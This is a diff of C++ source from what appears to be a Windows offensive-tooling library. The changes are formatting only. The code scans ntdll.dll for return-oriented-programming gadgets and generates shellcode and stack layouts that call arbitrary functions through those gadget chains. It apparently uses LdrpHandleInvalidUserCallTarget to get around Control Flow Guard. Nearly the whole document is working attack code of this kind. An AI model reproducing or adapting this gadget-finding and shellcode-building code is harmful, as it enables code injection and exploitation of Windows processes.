@@ -18,12 +18,15 @@ const auto system_dlls = {
 };
 
 PVOID find_rop_gadget_inf_loop() {
-    return pe::find_code_in_module("ntdll.dll", {
-        0xEB, 0xFE // JMP -2 (infinite loop)
-    });
+    return pe::find_code_in_module(
+        "ntdll.dll",
+        {
+            0xEB, 0xFE // JMP -2 (infinite loop)
+        }
+    );
 }
 
-}
+} // namespace shellcode
 
 namespace shellcode::x64 {
 
@@ -35,10 +38,10 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
         0x58, // pop rax
         0x5A, // pop rdx
         0x59, // pop rcx
-        //0x5B, // pop rbx
-        //0x5E, // pop rsi
-        //0x5F, // pop rdi
-        //0x5D, // pop rbp
+        // 0x5B, // pop rbx
+        // 0x5E, // pop rsi
+        // 0x5F, // pop rdi
+        // 0x5D, // pop rbp
     };
 
     uint16_t pop_16[] = {
@@ -59,8 +62,8 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
             return NULL;
         }
 
-        auto* begin = (uint8_t*)&module_code.front();
-        auto* end = (uint8_t*)PTR_ADD(begin, module_code.size());
+        auto *begin = (uint8_t *)&module_code.front();
+        auto *end = (uint8_t *)PTR_ADD(begin, module_code.size());
 
         auto it = begin + sizeof(uint16_t) * count; // max possible chain
         if (it > end) {
@@ -79,7 +82,7 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
                 bool found = false;
 
                 for (uint16_t pop : pop_16) {
-                    if (*(uint16_t*)&*it_back == pop) {
+                    if (*(uint16_t *)&*it_back == pop) {
                         found = true;
                         pop_count++;
                         break;
@@ -93,7 +96,7 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
                 it_back++; // then check 1-bytes instructions
 
                 for (uint8_t pop : pop_8) {
-                    if (*(uint8_t*)&*it_back == pop) {
+                    if (*(uint8_t *)&*it_back == pop) {
                         found = true;
                         pop_count++;
                         break;
@@ -110,7 +113,7 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
                 add_rsp |= ((count - pop_count) * 8) << 24; // 48 83 C4 XX
 
                 if (pop_count) {
-                    if (*(uint32_t*)&*it_back == add_rsp) {
+                    if (*(uint32_t *)&*it_back == add_rsp) {
                         return (PVOID) & *it_back;
                     }
                 }
@@ -130,17 +133,20 @@ PVOID find_rop_gadget_pop_values_and_ret(size_t count) {
 }
 
 PVOID find_rop_gadget_pop_value_and_ret() {
-    return pe::find_code_in_module("ntdll.dll", {
-        0x58, // pop rax
-        0xC3  // ret
-    });
+    return pe::find_code_in_module(
+        "ntdll.dll",
+        {
+            0x58, // pop rax
+            0xC3  // ret
+        }
+    );
 }
 
 PVOID find_rop_gadget_ret() {
     return pe::find_code_in_module("ntdll.dll", { 0xC3 });
 }
 
-}
+} // namespace shellcode::x64
 
 namespace shellcode::x64::LdrpHandleInvalidUserCallTarget {
 
@@ -173,28 +179,34 @@ namespace shellcode::x64::LdrpHandleInvalidUserCallTarget {
 //  .text:0000000180123B3C C3                                            retn
 
 PVOID find_rop_gadget_pop_values_and_jmp() {
-    return pe::find_code_in_module("ntdll.dll", {
-        0x58, // pop rax
-        0x5A, // pop rdx
-        0x59, // pop rcx
-        0x41, 0x58, // pop r8
-        0x41, 0x59, // pop r9
-        0x41, 0x5A, // pop r10
-        0x41, 0x5B, // pop r11
-        0x48, 0xFF, 0xE0 // jmp rax
-    });
+    return pe::find_code_in_module(
+        "ntdll.dll",
+        {
+            0x58,            // pop rax
+            0x5A,            // pop rdx
+            0x59,            // pop rcx
+            0x41, 0x58,      // pop r8
+            0x41, 0x59,      // pop r9
+            0x41, 0x5A,      // pop r10
+            0x41, 0x5B,      // pop r11
+            0x48, 0xFF, 0xE0 // jmp rax
+        }
+    );
 }
 
 PVOID find_rop_gadget_setup_reg_values_and_ret() {
-    return pe::find_code_in_module("ntdll.dll", {
-        0x5A, // pop rdx
-        0x59, // pop rcx
-        0x41, 0x58, // pop r8
-        0x41, 0x59, // pop r9
-        0x41, 0x5A, // pop r10
-        0x41, 0x5B, // pop r11
-        0xC3 // ret
-    });
+    return pe::find_code_in_module(
+        "ntdll.dll",
+        {
+            0x5A,       // pop rdx
+            0x59,       // pop rcx
+            0x41, 0x58, // pop r8
+            0x41, 0x59, // pop r9
+            0x41, 0x5A, // pop r10
+            0x41, 0x5B, // pop r11
+            0xC3        // ret
+        }
+    );
 }
 
 PVOID find_rop_gadget_pop_values_and_ret8(size_t count) {
@@ -203,8 +215,7 @@ PVOID find_rop_gadget_pop_values_and_ret8(size_t count) {
 
     std::vector<uint8_t> code;
 
-    switch (count)
-    {
+    switch (count) {
     case 8:
         code.insert(code.end(), { 0x41, 0x5F }); // pop r15
     case 7:
@@ -241,8 +252,10 @@ PVOID find_clean_stack_gadget(size_t count, size_t& extra_imm64) {
     return NULL;
 };
 
-std::vector<UINT64> build_stack_for_gadget(PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
-                                           const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned) {
+std::vector<UINT64> build_stack_for_gadget(
+    PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
+    const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned
+) {
 
     size_t extra_imm64 = 0;
 
@@ -264,14 +277,14 @@ std::vector<UINT64> build_stack_for_gadget(PVOID RetAddr, PVOID FunctionAddress,
         };
 
         for (auto arg : {
-                Arg2,                   // rdx
-                Arg1,                   // rcx
-                Arg3,                   // r8
-                Arg4,                   // r9
-                (UINT64)0,              // r11 (none)
-                (UINT64)0,              // r10 (none)
-                (UINT64)FunctionAddress,
-            }) {
+                 Arg2,      // rdx
+                 Arg1,      // rcx
+                 Arg3,      // r8
+                 Arg4,      // r9
+                 (UINT64)0, // r11 (none)
+                 (UINT64)0, // r10 (none)
+                 (UINT64)FunctionAddress,
+             }) {
             push_imm64(arg);
             imm64_count--; // args will be popped by gadget
         }
@@ -309,8 +322,10 @@ std::vector<UINT64> build_stack_for_gadget(PVOID RetAddr, PVOID FunctionAddress,
     } while (true);
 }
 
-std::vector<uint8_t> build_shellcode_for_gadget(PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
-                                                const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned) {
+std::vector<uint8_t> build_shellcode_for_gadget(
+    PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
+    const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned
+) {
 
     size_t extra_imm64 = 0;
 
@@ -329,7 +344,7 @@ std::vector<uint8_t> build_shellcode_for_gadget(PVOID RetAddr, PVOID FunctionAdd
 
         auto push_imm64 = [&](UINT64 value) {
             shellcode.insert(shellcode.end(), { 0x48, 0xB8 }); // mov rax, imm64
-            shellcode.insert(shellcode.end(), (uint8_t*)&value, (uint8_t*)&value + sizeof(uint64_t));
+            shellcode.insert(shellcode.end(), (uint8_t *)&value, (uint8_t *)&value + sizeof(uint64_t));
             shellcode.insert(shellcode.end(), { 0x50 }); // push rax
             imm64_count++;
         };
@@ -359,20 +374,20 @@ std::vector<uint8_t> build_shellcode_for_gadget(PVOID RetAddr, PVOID FunctionAdd
         push_imm64((UINT64)StackCleanGadgetAddr);
 
         for (auto arg : {
-                (UINT64)FunctionAddress,
-                (UINT64)0,              // r11 (none)
-                (UINT64)0,              // r10 (none)
-                Arg4,                   // r9
-                Arg3,                   // r8
-                Arg1,                   // rcx
-                Arg2,                   // rdx
-            }) {
+                 (UINT64)FunctionAddress,
+                 (UINT64)0, // r11 (none)
+                 (UINT64)0, // r10 (none)
+                 Arg4,      // r9
+                 Arg3,      // r8
+                 Arg1,      // rcx
+                 Arg2,      // rdx
+             }) {
             push_imm64(arg);
             imm64_count--; // args will be popped by gadget
         }
 
         shellcode.insert(shellcode.end(), { 0x48, 0xB8 }); // mov rax, imm64
-        shellcode.insert(shellcode.end(), (uint8_t*)&CallGadgetAddr, (uint8_t*)&CallGadgetAddr + sizeof(uint64_t));
+        shellcode.insert(shellcode.end(), (uint8_t *)&CallGadgetAddr, (uint8_t *)&CallGadgetAddr + sizeof(uint64_t));
         shellcode.insert(shellcode.end(), { 0xFF, 0xE0 }); // jmp rax
 
         // when rip becomes equal to FunctionAddress, we should have an unaligned stack (aligned + imm64 RetAddr)
@@ -384,4 +399,4 @@ std::vector<uint8_t> build_shellcode_for_gadget(PVOID RetAddr, PVOID FunctionAdd
     } while (true);
 }
 
-}
+} // namespace shellcode::x64::LdrpHandleInvalidUserCallTarget
